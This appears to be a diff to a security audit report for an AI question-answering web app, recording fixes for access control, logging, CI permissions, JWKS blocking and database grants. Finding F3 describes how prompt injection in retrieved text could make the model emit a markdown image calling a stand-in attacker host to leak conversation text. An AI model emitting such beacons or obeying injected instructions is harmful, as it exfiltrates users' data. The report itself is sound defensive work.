@@ -10,11 +10,11 @@ Method: attack-surface map (routes × auth class), then category by category; ea
 |----|----------|-------|--------|
 | F1 | **High** | `/api/devtools/feedback-digest` readable by any signed-in account | Fixed |
 | F2 | **Medium** | Sentry captured stack-frame locals, including the user's question | Fixed |
-| F3 | **Medium** | Markdown images in AI answers allow data-exfil beacons (CSP `img-src https:`) | Fixed (client) |
+| F3 | **Medium** | Markdown images in AI answers allow data-exfil beacons (CSP `img-src https:`) | Fixed (client and server) |
 | F4 | Low | CI workflows had no `permissions:` block | Fixed |
-| F5 | Low | JWKS verification is synchronous inside async paths | Open (described) |
-| F6 | Low | `check_and_reserve_user_budget` has no explicit `REVOKE` from `anon`/`authenticated` | Open (SQL to run) |
-| F7 | Low | Other `/api/devtools/*` and `/api/stack/health` routes accept any signed-in account | Open |
+| F5 | Low | JWKS verification is synchronous inside async paths | Fixed |
+| F6 | Low | `check_and_reserve_user_budget` has no explicit `REVOKE` from `anon`/`authenticated` | Fixed (SQL run in Supabase by the operator) |
+| F7 | Low | Other `/api/devtools/*` and `/api/stack/health` routes accept any signed-in account | Fixed |
 | F8 | Info | Clerk `aud` is only checked when `CLERK_AUDIENCE` is set | Open (documented) |
 | F9 | Info | bandit B324 (`sefaria_library.py:158`, hash used as a cache key) | Open (cosmetic) |
 
@@ -34,22 +34,23 @@ Method: attack-surface map (routes × auth class), then category by category; ea
 - **Where:** `static/js/shell.js` `renderAnswerMarkdown` (DOMPurify with the HTML profile allowed `<img>`); CSP `backend/csp.py:117` has `img-src 'self' data: https:`.
 - **Impact:** an indirect prompt injection in retrieved text (Sefaria/Wikipedia/web) or a user-memory could make the model emit `![](https://attacker.example/c.png?q=<conversation text>)`. The browser fetches it on render, leaking text to a third party with no click. Requires a successful injection first, hence Medium. `retrieval_guard` is a phrase heuristic and not a guarantee.
 - **Fix:** `FORBID_TAGS` (`img`, `picture`, `source`, `video`, `audio`, `form`, `input`, `textarea`, `button`, `select`, `style`, `link`, `meta`, `iframe`, `object`, `embed`, `svg`, `math`) on the answer sanitizer; `static/min` rebuilt. Regression: `test_f3_answer_renderer_forbids_beacon_tags` (static check of the source; a real-browser run was **not** done, see §5).
-- **Cross-lane note:** this touches frontend JS. Defense in depth still open: stripping `![...](http...)` server-side in `backend/claude.py::_sanitize_model_output`, and narrowing `img-src` to the hosts actually used.
+- **Server side:** `backend/claude.py::_sanitize_model_output` now strips markdown images (inline and reference style) and `<img>` tags, keeping alt text. Test: `test_f3_model_output_loses_embedded_images`. **Cross-lane note:** the client fix touches frontend JS. Still open: narrowing CSP `img-src` from `https:` to the hosts actually used.
 
 ### F4 (Low): workflows without `permissions:`
 `ci.yml` and `rls-verify.yml` inherited the repo default token scope. Both now declare `permissions: contents: read`. Actions were already pinned by SHA. Test: `test_f4_workflows_declare_least_privilege`.
 
 ### F5 (Low): sync JWKS lookup on the event loop
-`backend/auth.py:58` (`get_signing_key_from_jwt`) and the sync `extract_user_id_from_bearer_value` call from `RateLimitMiddleware` (`backend/rate_limit.py`, llm/account classes) can block the loop on a cold JWKS fetch. Not fixed (touches the hot path of every `/ask`). Suggested: wrap in `asyncio.to_thread` at the two async call sites, keeping the JWKS cache warm at startup.
+`backend/auth.py` `get_signing_key_from_jwt` is a blocking HTTP fetch on a cold cache and, in PyJWT's `PyJWKClient`, on **every unknown `kid`**. `RateLimitMiddleware` (llm/account classes) and `ask_async` called it directly on the loop, *before* the rate-limit check, so a stream of bearer tokens with random `kid`s could stall the loop and hammer Clerk's JWKS endpoint. **Fix:** both call sites now use `asyncio.to_thread(extract_user_id_from_bearer_value, ...)`. Test: `test_f5_bearer_verification_runs_off_the_event_loop`. Remaining idea (not done): a negative cache for unknown `kid`s.
 
 ### F6 (Low): budget RPC grants
-`scripts/sql/check_and_reserve_user_budget.sql:123` revokes only from `PUBLIC`; Supabase's default privileges grant `EXECUTE` to `anon`/`authenticated` directly. The function is not `SECURITY DEFINER` and `ai_usage_log` has RLS enabled with no policy (`docs/DATABASE.md:157,384`), so an anon caller's insert should be denied by RLS. I could not verify the live grants (no DB access by design). Suggested one-liner, safe because only the service role calls it (`backend/cost_meter.py`):
+`scripts/sql/check_and_reserve_user_budget.sql:123` revoked only from `PUBLIC`; Supabase's default privileges grant `EXECUTE` to `anon`/`authenticated` directly. The function is not `SECURITY DEFINER` and `ai_usage_log` has RLS enabled with no policy (`docs/DATABASE.md:157,384`), so an anon insert would have been denied by RLS anyway. The operator ran this in the Supabase SQL Editor on 2026-10-16 (not independently verified by me):
 ```sql
 REVOKE EXECUTE ON FUNCTION public.check_and_reserve_user_budget(TEXT, TEXT, NUMERIC, NUMERIC) FROM anon, authenticated;
 ```
+The statement is not yet recorded in `scripts/sql/`; add it to the setup SQL so a rebuilt database matches.
 
 ### F7 (Low): other devtools routes
-`stack_health`, `reliability` and `api_health_alias` reveal rate-limit thresholds and configuration state to any signed-in account. Same remedy as F1 (`_is_admin_user`); not applied because it changes the behaviour of scripts that call them (`scripts/verify_integrations.py`).
+`stack_health`, `/api/health`, `devtools_reliability` and `devtools_rls_audit` revealed rate-limit thresholds, configuration state and RLS audit data to any signed-in account. A shared `require_admin` decorator (the F1 allowlist) now guards all four plus the feedback digest. `scripts/verify_integrations.py` already treats 401/403 as "up", and no frontend code calls these routes. Test: `test_f7_diagnostics_need_the_operator`.
 
 ### F8 (Info): audience
 `_verify_clerk_token` pins `algorithms=["RS256"]`, verifies `exp` and `iss`, and checks `aud` only when `CLERK_AUDIENCE` is set. Memory records that the dev Clerk template lacks `aud`, so this is understood. Forged-token matrix (alg `none`, HS256 key-confusion, expired, wrong issuer) is rejected: `test_jwt_forgeries_rejected`; valid RS256 accepted.
@@ -91,7 +92,7 @@ Service worker: private API prefixes (`/api/user/`, `/api/auth/`, `/api/conversa
 - Graph and docs were consulted via grep and direct reads; no graphify queries were run for flow tracing.
 
 ## 6. Test-suite state
-Full suite: 5427 passed, 1 failed. The failure, `tests/test_gemini_cooldown.py::TestOpeningTheCircuit::test_checking_gemini_never_touches_the_network`, also fails on a clean `HEAD` (checked with the audit changes stashed), so it predates this audit; it belongs to the unpushed Gemini-cooldown work (`f2a63d5`). `ruff check` is clean.
+Full suite: 5518 passed, 0 failed; `ruff check` clean. One test, `tests/test_gemini_cooldown.py::TestOpeningTheCircuit::test_checking_gemini_never_touches_the_network`, failed earlier in the session on a clean `HEAD` as well (so not caused by the audit) and then passed without any change on later runs. It freezes time at a fixed date, so it is probably wall-clock dependent; I could not reproduce it again and did not change it.
 
 ## 7. Fix summary
-`backend/routes_devtools.py` (F1), `backend/logging_setup.py` (F2), `static/js/shell.js` + `static/min/` (F3), `.github/workflows/*.yml` (F4); tests in `tests/test_security_audit_2026_10.py`, plus `tests/test_routes_devtools.py` (sets `ADMIN_USER_IDS` for the digest class). New env var `ADMIN_USER_IDS` (add to `docs/ENVIRONMENT.md` when merging).
+`backend/routes_devtools.py` (F1, F7), `backend/logging_setup.py` (F2), `static/js/shell.js` + `static/min/` and `backend/claude.py` (F3), `.github/workflows/*.yml` (F4), `asgi.py` + `backend/rate_limit.py` (F5); tests in `tests/test_security_audit_2026_10.py`, plus `tests/test_routes_devtools.py` (sets `ADMIN_USER_IDS` for the digest class). New env var `ADMIN_USER_IDS` (add to `docs/ENVIRONMENT.md` when merging).
